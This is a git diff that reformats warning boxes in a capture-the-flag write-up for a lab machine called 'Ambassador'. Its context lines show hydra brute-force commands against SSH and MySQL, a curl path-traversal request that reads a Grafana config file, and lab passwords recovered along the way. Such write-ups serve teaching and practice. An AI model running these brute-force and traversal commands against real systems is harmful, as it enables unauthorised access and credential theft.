@@ -2,7 +2,6 @@
 title: "Ambassador"
 ---
 
-
 ## Enumeration
 
 ```bash
@@ -36,9 +35,8 @@ Option number 1 brute force ssh with hydra and developer account
 hydra -l developer -P /usr/share/wordlists/rockyou.txt 10.10.11.183 ssh
 ```
 
-:::danger
-DEAD END
-:::
+!!! danger
+    DEAD END
 
 ## HTTP
 
@@ -94,9 +92,8 @@ DOWNLOADED: 18448 - FOUND: 6
 
 ```
 
-:::danger
-DEAD END
-:::
+!!! danger
+    DEAD END
 
 ## MYSQL
 
@@ -123,9 +120,8 @@ hydra -l root -P  /usr/share/metasploit-framework/data/wordlists/unix_passwords.
 hydra -l developer -P  /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 10.10.11.183 mysql
 ```
 
-:::danger
-DEAD END
-:::
+!!! danger
+    DEAD END
 
 ## Grafana
 
@@ -197,8 +193,6 @@ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertGroups/../../../.
 # If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
 ;password =
 
-
-
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
 # default admin user, created on startup
@@ -206,8 +200,6 @@ curl --path-as-is http://10.10.11.183:3000/public/plugins/alertGroups/../../../.
 
 # default admin password, can be changed before first start of grafana,  or in profile settings
 admin_password = messageInABottle685427
-
-
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ```
@@ -298,11 +290,10 @@ MySQL [whackywidget]>
 echo -n "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" |base64 -d
 ```
 
-:::warning
-```
-password: anEnglishManInNewYork027468
-```
-:::
+!!! warning
+    ```
+    password: anEnglishManInNewYork027468
+    ```
 
 ![](../assets/image-4-1.png)
 
@@ -326,7 +317,6 @@ I also find an interesting git folder
 ╔══════════╣ Analyzing Github Files (limit 70)
                                                                                                                                  
 -rw-rw-r-- 1 developer developer 93 Sep  2 02:28 /home/developer/.gitconfig
-
 
 drwxrwxr-x 8 root root 4096 Mar 14  2022 /opt/my-app/.git
 
@@ -394,8 +384,6 @@ index 35c08f6..fc51ec0 100755
 ## Consul
 
 The best bet so far seems to use consul(port 8500) with a Metasploit method to root the machine, however, the service is not exposed
-
-
 
 * searchexploit
 
